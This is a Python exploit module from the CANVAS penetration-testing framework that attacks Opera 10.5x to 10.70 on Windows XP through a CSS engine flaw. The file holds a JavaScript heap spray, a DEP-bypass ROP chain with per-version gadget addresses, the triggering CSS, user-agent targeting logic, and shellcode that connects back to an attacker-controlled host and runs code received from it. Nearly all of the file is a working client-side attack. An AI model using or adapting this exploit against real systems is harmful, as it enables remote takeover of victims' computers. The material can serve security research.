#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  opera_css.py
## Description:
##            :
## Created_On :  Mon Dec 20 13:38:59 2010
## Created_By :  Kostya Kortchinsky
## Modified_On:  Mon Dec 20 15:27:57 2010
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside
from shellcode import shellcodeGenerator, win32shell
from win32shellcodegenerator import *
import canvasengine

NAME = "Opera CSS Uninitialized Variable Vulnerability"
DESCRIPTION = "Opera CSS Engine Uninitialized Stack Variable/Invalid Context"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR'] = "Opera"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION["Date public"] = "10/12/2010"
DOCUMENTATION["CVE Name"] = "N/A"
DOCUMENTATION["CVS URL"] = "N/A"
DOCUMENTATION["MSRC"] = ""
DOCUMENTATION["Note"] = "Exploit cleanup is not implemented--we simply close the browser process."

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = ["XP"]		# for now just xp [ "2000","XP","2003", "Vista" ]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""

Usage:
- ./exploits/httpserver/httpserver.py -O singleexploit:opera_css -l 192.168.2.101 -p 8080 -d 5555
- ./commandlineInterface.py -v 17 -p 5555
Tested on:
- Windows XP SP3 Professional English up-to-date with Opera 10.62, 10.61, 10.60

"""

CHANGELOG="""
"""

DEBUGNOTES="""
"""


class win32_cleanup(win32):
    """
    Derives from our previous one, but has our cleanup code in it.
    """

    def __init__(self):
        win32.__init__(self)
        self.handlers["opera_cleanup"]=self.opera_cleanup
        self.vProtectSelf = True

    def opera_cleanup(self, args):
        """
        Cleans up Opera to avoid crashes
        """

        cleanup_code = """
		opera_cleanup:
		    //.byte 0xcc                            //DEBUG
		    nop
		    nop
		    nop
		    xorl %ecx, %ecx
		    movl 0x0C0C0C2C(%ecx), %ebp
		    movl %ebp, %esp
		    subl $0x34, %esp
		    pop %edi
		    pop %esi
		    pop %ebx
		    movl %ebp, %esp
		    pop %ebp
		    ret $0x1C
		"""
        self.code+=cleanup_code

        return

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)

        self.listenerArgsDict['fromcreatethread']=1
        self.badstring=""
        self.setVersions()
        self.version= 0
        self.name=NAME
        self.filename="oprah.html"
        self.subesp=0
        self.url='http://www.immunityinc.com/tools/calce.exe'
        self.nohttpmosdef=True
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={
            0: ['Autodetect'],
            1: ['version/10.54', 0x67B8D0DC, 0x6809D044, 0x67B91C46, 0x67BB37A0],
            2: ['version/10.60', 0x67B66F15, 0x6809A044, 0x67B6A26B, 0x67B75F75],
            3: ['version/10.61', 0x67B6FB6C, 0x6809D044, 0x67B6FAAE, 0x67BBE493],
            4: ['version/10.62', 0x67B6373E, 0x68094044, 0x67B681A6, 0x67B69DEA],
            # 10.63: fixed - "Incorrect compilation to native code leads to wrong arithmetic results"
            5: ['version/10.70', 0x67B62B44, 0x68095044, 0x67B62A8A, 0x67B7521F], #alpha build 3483
            # 10.70: not fixed yet
        }

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def createShellcode(self):
        import shellcode.standalone.windows.payloads as payloads

        p = payloads.payloads()
        #sc = p.httpcachedownloadloop( self.url, sleep=10 )
        host = self.callback.ip
        port = self.callback.port
        self.log("Shellcode calling back to %s:%d"%(host, port))
        injectme = ''

        if self.HTTPMOSDEF and not self.nohttpmosdef:
            import shellcode.standalone.windows.payloads as payloads

            p   = payloads.payloads()
            sc  = p.http_proxy(host, port, SSL=self.useSSLMOSDEF)
            injectme = p.assemble(sc)
            self.log('HTTP Mosdef payload size: %d bytes' % len(injectme))
        else:
            self.log("Using TCP callback shellcode (%s:%d)"%(host,port))
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe", None) #MOSDEF
            sc.addAttr("ExitProcess", None)
            self.callback.argsDict["fromcreatethread"] = 0
            injectme = sc.get()

        sc = win32_cleanup()
        sc.addAttr("findeipnoesp", None)
        sc.addAttr("InjectToSelf", { "injectme" : injectme, "DONTEXIT" : False })
        sc.addAttr("opera_cleanup", None)
        self.shellcode = mosdef.assemble("""
//.byte 0xCC
xorl %ecx,%ecx
movl %ebp, 0x0C0C0C2C(%ecx)
movl %ebp, %esp
subl $0x200, %esp
""", "x86")+sc.get()
        return self.shellcode

    def buildHtml(self):
        html = """<html>
                <head>
		</head>
		<body>
		<DIV id="test"> </DIV>
		<script language="javascript">
		var odiv;
		var oframes;

		function spray(arr, realdata, bigblock_size, counter) {
		    var bigblock=realdata;
		    bigblock_size-=0x44;
		    while (bigblock.length < bigblock_size) bigblock+=bigblock;
		    var precise_bigblock=bigblock.substring(0, bigblock_size);
		    var part1=precise_bigblock.substring(0, precise_bigblock.length/2);
		    var part2=precise_bigblock.substring(part1.length, precise_bigblock.length);
		    arr[0]=part1+part2;
		    arr[1]=part1+part2;
		    for (var i=2; i<counter; i++) {
			arr[i]=arr[i-2].substring(0, part1.length) + arr[i-1].substring(part1.length,precise_bigblock.length);
		    }
		}

		function format_dword(num) {
		  tmp=num.toString(16);
		  tmp="00000000".substring(0,8-tmp.length)+tmp;
		  return unescape("%u"+tmp.substring(4,8) + "%u" + tmp.substring(0,4));
		}

		sprayer = new Array();

		chain = "";
		while (chain.length < 0x5E2) chain+="\u0C0C";

		// DEP bypass code here - starts at 0x0C0C0C0C
                chain += format_dword(SRET1);  // pop ecx, retn 4
                chain += format_dword(SRET2);  // VirtualProtect ptr
                chain += format_dword(SRET3);  // jmp [ecx]
                chain += format_dword(SRET4);  // xchg eax, esp / ret
                chain += format_dword(0x0C0C0C34);  // return address (payload)
                chain += format_dword(0x0C0C0C34);  // lpAddress
                chain += format_dword(0x00001000);  // dwSize
                chain += format_dword(0x00000040);  // flNewProtect
                chain += format_dword(0x0C0C0C30);  // lpflOldProtect
                chain += format_dword(0x42424242);  // flOldProtect
                chain += unescape("SHELLCODE");

		while (chain.length < 0x1000) chain+="\u0C0C";
		spray(sprayer, chain, 0x000100000, 0xE0);
		</script>

		<script>
		odiv = document.getElementById('test');
		odiv.innerHTML = '';
		</script>

		<script>

		oframes = document.createElement('noframes');
		odiv.appendChild(oframes);

		oframes.style.borderBottomLeftRadius = "0.414243em 0.41423390em";
		oframes.style.borderTopLeftRadius = "2147483648px 414243px";
		oframes.style.fontFamily = "LOL";

		</script>
		</body></html>
		"""

        # Code exec opcodes : 0x31, 0x49, 0x60 (0x61 on 10.70)
        # current value -> 0x31 (+cleanup code)

        if self.version == 0:
            self.version = 1
            self.log('Using %s' % self.versions[self.version][0])

        html = html.replace("SRET1", str(self.versions[self.version][1]));
        html = html.replace("SRET2", str(self.versions[self.version][2]));
        html = html.replace("SRET3", str(self.versions[self.version][3]));
        html = html.replace("SRET4", str(self.versions[self.version][4]));

        html = html.replace("SHELLCODE", urluencode(self.shellcode));
        return html

    def is_vulnerable(self, info_dict):
        user_agent = info_dict['user_agent']
        if user_agent.count("Opera")==0:
            return 0
        if user_agent.lower().count("windows nt 5.1") == 0:
            #check for winxp
            return 0
        if self.version==0:
            for v in self.versions.keys():
                if user_agent.lower().count(self.versions[v][0]) > 0:
                    self.version=v
                    break
        elif user_agent.lower().count(self.versions[self.version][0]) == 0:
            self.version=0
        if self.version==0:
            return 0
        return 1


    def makesploit(self,clientheader,clientbody):
        """
        Construct the attack
        """
        from libs.spkproxy import header, body

        h=header("SERVER")
        b=body()
        user_agent=clientheader.getStrValue(["User-Agent"])
        self.log("User agent of connecting host: %s"%user_agent)

        if user_agent.count("Opera")==0:
            self.log("Non Opera browser connected - returning None")
            return None,None
        if user_agent.lower().count("windows nt 5.1") == 0:
            #check for winxp
            return None,None
        if self.version==0:
            for v in self.versions.keys():
                if user_agent.lower().count(self.versions[v][0]) > 0:
                    self.version=v
                    break
        elif user_agent.lower().count(self.versions[self.version][0]) == 0:
            self.version=0
        if self.version==0:
            self.log("Opera is not a supported version (need 10.54-10.70) - returning None")
            return None,None

        if clientheader.URL.count(self.filename):
            self.log('Serving HTML file')
            self.createShellcode()
            b.setBody(self.buildHtml())
            h.addHeader('Content-Type', 'text/html')
        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h,b

    def getArgs(self):
        self.filename = self.argsDict.get('filename', self.filename)

    def run(self):
        self.getArgs()
        self.createShellcode()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(self.buildHtml())
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
